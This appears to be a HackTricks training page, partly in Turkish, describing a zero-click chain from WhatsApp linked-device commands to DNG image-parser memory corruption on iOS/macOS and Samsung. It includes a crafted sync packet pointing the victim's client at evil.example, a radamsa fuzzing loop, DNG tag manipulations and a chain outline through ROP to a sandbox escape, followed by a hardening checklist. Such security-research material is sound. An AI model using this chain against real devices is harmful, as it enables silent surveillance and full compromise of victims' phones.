# Zero-click Messaging → Image Parser Chains

{{#include ../../banners/hacktricks-training.md}}

## TL;DR

- Mesajlaşma uygulamalarının çoklu cihaz/ek yardımcı cihaz protokollerini uzak kontrol kanalları olarak değerlendirin: protokol alanlarının güvenilir cihazlardan geldiği varsayılsa bile bunlar yine kullanıcı tarafından kontrol edilebilir ve genellikle mağdura doğrudan yeniden oynatılarak **0 user interaction** ile rastgele içerik yüklenebilir.
- Herhangi bir uygulama güvensiz medyayı getirmeye zorlanabildiğinde, sandbox'tan çıkmak için bozuk dosyalarla **paylaşılan OS medya pipeline**'ını hedefleyin (RawCamera on iOS/macOS, vendor parsers on Android OEM builds).
- Burada tartışılan DNG-tabanlı RawCamera ve Samsung parser hataları somut örneklerdir, ancak tam teknik yeniden kullanılabilir bir şablondur: **logic flaws → image parser memory corruption → full device compromise** zincirlemesi için kullanılabilir.

## Remote content loading via WhatsApp linked-device commands

### Saldırı yüzeyi özeti

WhatsApp "linked devices" mimarisi, birincil telefonu ve her yardımcı cihazı (masaüstü, tablet, ikincil telefon) şifrelenmiş, yapılandırılmış protokol mesajlarıyla senkron tutar. Her mesaj şunları kodlar:

- **Device metadata** (device ID, yetenekler, özellik bayrakları).
- **Action descriptors** (ör. sohbetleri senkronize etme, küçük resimleri alma, uzak içeriği render etme).
- **Arbitrary parameters** gibi URI'ler, MIME ipuçları, sayfalandırma anahtarları vb.

Apple istemcilerinde, bu linked-device kontrol paketlerini işleyen işleyici, geçerli bir eşlemenin zaten gerçekleştiğini **örtük olarak varsayıyordu**, bu yüzden yüksek etkili alanlar (ör. `resource_url`, `open_media`, `sync_snapshot`) yalnızca asgari düzeyde doğrulanıyordu. Bu nedenle kötü amaçlı bir yardımcı mesaj şunları yapabilirdi:

1. Telefon numarasıyla tanımlanan herhangi bir hesaba yönlendirilebilirdi.
2. Alıcının göndericinin meşru olarak eşlenmiş bir cihaz olduğunu doğrulamaması nedeniyle taşıma yığınına (Noise protocol + WhatsApp protobuf framing) takılmadan geçebiliyordu.
3. iOS istemcisine ulaşır, burada savunmasız kod yolu otomatik olarak saldırgan URL'sine arka plan HTTP(S) isteği başlatır ve yanıtı gizli bir WebView/media renderer'da ayrıştırırdı.

### Denetçiler için pratik iş akışı

1. **Meşru linked-device trafiğini yakalayın.** Bir debugger veya Frida script'i desktop/iOS istemcisine ekleyin ve şifre çözme sonrası işleyiciyi hook'layın (ör. `LinkedDevicesSyncHandler::processAction`). Çözümlenmiş protobuf payload'larını dökerek mevcut eylem türlerini ve parametreleri öğrenin.
2. **Güven sınırlarını aşan alanları tespit edin.** Katı izin listeleri olmadan `http_url`, `thumbnail_uri`, `download_url` veya `render_html` parametreleri taşıyan herhangi bir eylem uzaktan içerik primitive'i adayıdır.
3. **Kötü amaçlı bir eylem oluşturun.** Gözlemlenen protobuf şemasını yeniden kullanın ve yalnızca saldırgan tarafından kontrol edilen alanları değiştirin. İlgili mantıksal yapının basitleştirilmiş JSON görünümü aşağıda gösterilmiştir (gerçek taşıma protobuf/Noise üzerindedir, ancak anlamsal alanlar eşleşir):
```json
{
"op": "sync_action",
"device_id": "<attacker-companion>",
"payload": {
"target": "content_sync",
"resource_url": "https://evil.example/payload.html",
"media_type": "image/dng",
"flags": ["background_fetch", "render_inline"]
}
}
```
4. **Kurbanın cihazına ulaştırın.** Oluşturduğunuz paketi, bağlı cihaz trafiğini normalde ileten aynı WhatsApp servisi üzerinden yeniden oynatın (ör. değiştirilmiş bir masaüstü istemcisi veya saldırgan hesap anahtarlarınızı yeniden kullanan özel bir Noise client). CVE-2025-55177 işlemleri kimlik doğrulanmış cihazlara bağlamadığı için, kurbanın iOS/macOS istemcisi mesajı kabul eder ve herhangi bir UI olmaksızın saldırgan URL'sini hemen getirir.
5. **Getirme işlemini enstrümente edin.** Zorlanmış HTTP(S) isteğini ve dahili renderer'ı (WKWebView/ImageIO) gözlemleyin. Bu noktada WhatsApp içinde bir zero-click web delivery primitive'ine sahip olursunuz.

## Otomatik çözümlenen DNG'leri RawCamera'a karşı silahlandırma

Saldırgan WhatsApp'ın ne yüklediğini kontrol etmeye başladıktan sonra, bir sonraki hedef iOS/macOS'un **Digital Negative (DNG)** uzantılı kötü niyetli bir dosyayı **RawCamera** framework'ü ile parse etmesini sağlamaktır. Bir `<img>`/CSS içinde gömülü ve `.dng` ile sonuçlanan herhangi bir URL, sistem görüntü boru hattına iletilecek ve WhatsApp DNG'leri açıkça işlememiş olsa bile RawCamera'yi tetikleyecektir.

### WhatsApp'tan RawCamera'yı tetikleme

- Farklı render yollarını kapsamak için DNG'ye referans veren HTML sunun (ör. `<img src="evil.dng">`, CSS `background-image: url('evil.dng')`, veya `<picture>` kaynakları).
- Doğru MIME (`image/x-adobe-dng`) ve küçük önizlemeler sağlayın ki loader boyut heuristikleri nedeniyle erken vazgeçmesin.
- iOS medya sandbox'u dosyayı `CGImageSourceCreateWithURL` aracılığıyla RawCamera'ya akıtacak ve sonunda zafiyete sahip decoder'a ulaşacaktır.

### Belleği bozacak DNG'ler oluşturma (CVE-2025-43300 tarzı)

Yeniden üretilen hata, tampon tahsisini gerçek piksel okumalarından desenkronize eden tutarsız metadata'ya dayanıyordu. Tipik manevralar şunlardır:

- **Tile/strip descriptors**: `TileByteCounts`/`StripByteCounts`'ı gerçekçi değerlere ayarlayın ama `TileOffsets`'u tahsis edilmiş tamponun ötesine işaret edecek şekilde artırın.
- **Sub-IFD chains**: Çakışan `ImageWidth`/`ImageLength` ve `BitsPerSample` içeren ikincil görüntüleri gömün; böylece RawCamera küçük bir tampon hesaplarken sonraki aşamalar saldırgan kontrollü boyutlara güvenir.
- **Opcode metadata**: `OpcodeList3` girdilerini manipüle edin ki satır bazlı işlem saldırganın seçtiği indeksler üzerinde çalışsın.

Bu tür bozulmaları avlamak için temel bir mutation harness macOS etrafında inşa edilebilir; çünkü aynı RawCamera kodu macOS/iOS/iPadOS üzerinde dağıtılıyor:
```bash
#!/bin/bash
set -e
for sample in corpus/*.dng; do
radamsa "$sample" > /tmp/poc.dng
/System/Library/CoreServices/RawCamera.bundle/Contents/MacOS/RawCamera /tmp/poc.dng >/tmp/out 2>&1 || {
mv /tmp/poc.dng crashes/$(date +%s).dng
}
done
```
Each crash in `RawCamera` gives you a new primitive. The published PoC achieved a neat out-of-bounds read/write reliable enough to crash WhatsApp on iPhone, iPad, and Mac.

## Building the 0-click chain

1. **Linked-device packet** → coerces WhatsApp into fetching `https://evil.example/payload.html` without any taps.  
2. **Payload HTML** → silently references `evil.dng`, guaranteeing RawCamera is invoked by the OS media stack.  
3. **Malicious DNG** → abuses crafted tags to trigger the RawCamera OOB and crash/own the image decoder.  
4. **Post-corruption exploitation** → add info-leak gadgets (e.g., abusing predictable heap metadata) and stage a ROP/JOP chain to break out of the WhatsApp sandbox and into more privileged contexts.

Because every step is automatic, the attacker only needs the victim’s phone number. No notifications, banners, or prompts are shown on the target device.

## Samsung vendor image parser parallels

Samsung’s bulletin for CVE-2025-21043 confirmed that their proprietary image parsing stack (used by Gallery, Messages, and also indirectly by WhatsApp) suffered an **out-of-bounds write** reachable through untrusted media. The exploitation methodology mirrors the Apple chain:

- Identify an auto-preview vector (chat thumbnails, notification previews, share sheets) that parses the attacker file with Samsung’s `libimagecodec`/`libOneUI_ImageDecoder` libraries.  
- Diff OEM library updates or fuzz parsers with malformed RAW/DNG files until you see memory corruptions similar to the RawCamera crash (heap metadata clobber, register control, etc.).  
- Deliver the crafted file through any channel that already auto-loads content (e.g., the same linked-device primitive, WhatsApp preview fetchers, or Android’s push-to-talk waveform previews).

Once an OOB write exists in the vendor parser, combining it with the WhatsApp auto-fetch primitive yields another zero-click chain on Samsung devices.

## Testing & hardening checklist

- **Protocol validation**: Enforce strict allow-lists for every linked-device action. Companion commands that request a fetch/render must prove device pairing (signing the payload) and the URL should match an allow-list or signed blob.  
- **Transport replay countermeasures**: Bind each action to a per-device key and reject packets whose sender key is unknown, even if the protobuf syntax is correct.  
- **Media pipeline restrictions**: High-level apps should only allow approved MIME types and explicitly reject RAW/DNG unless the feature is required.  
- **Parser fuzzing regression tests**: Keep a corpora of malformed RAW/DNG files and run them against RawCamera/vendor decoders after every update.  
- **Crash triage automation**: Attach `DYLD_INSERT_LIBRARIES` sanitizers or MTE on fuzz devices to catch subtle OOB conditions before attackers do.

## References

- [DNGerousLINK: A Deep Dive into WhatsApp 0-Click Exploits on iOS and Samsung Devices](https://media.ccc.de/v/39c3-dngerouslink-a-deep-dive-into-whatsapp-0-click-exploits-on-ios-and-samsung-devices)

{{#include ../../banners/hacktricks-training.md}}
